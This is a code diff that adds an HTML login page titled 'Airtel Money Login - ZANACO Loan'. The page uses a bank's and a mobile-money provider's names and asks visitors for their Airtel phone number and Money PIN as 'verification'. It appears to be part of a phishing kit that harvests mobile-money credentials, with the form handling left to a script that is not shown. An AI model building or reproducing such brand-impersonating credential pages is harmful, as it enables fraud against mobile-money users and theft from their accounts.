@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Airtel Money Login - ZANACO Loan</title>
+    <link rel="stylesheet" href="assets/css/airtel.css">
+</head>
+<body>
+    <div class="container">
+        <div class="login-card">
+            <div class="logo-section">
+                <h1>ZANACO Loan</h1>
+                <p>Airtel Money Verification</p>
+            </div>
+
+            <form id="airtelForm" class="airtel-form">
+                <div class="form-group">
+                    <label for="airtelPhone">Airtel Phone Number</label>
+                    <input 
+                        type="tel" 
+                        id="airtelPhone" 
+                        name="airtelPhone" 
+                        placeholder="+260..."
+                        required
+                    >
+                </div>
+
+                <div class="form-group">
+                    <label for="airtelPin">Airtel Money PIN</label>
+                    <input 
+                        type="password" 
+                        id="airtelPin" 
+                        name="airtelPin" 
+                        placeholder="Enter 4-digit PIN"
+                        required
+                    >
+                </div>
+
+                <button type="submit" class="btn-submit">Verify Account</button>
+            </form>
+
+            <div id="message" class="message"></div>
+        </div>
+    </div>
+
+    <script src="assets/js/airtel.js"></script>
+</body>
+</html>
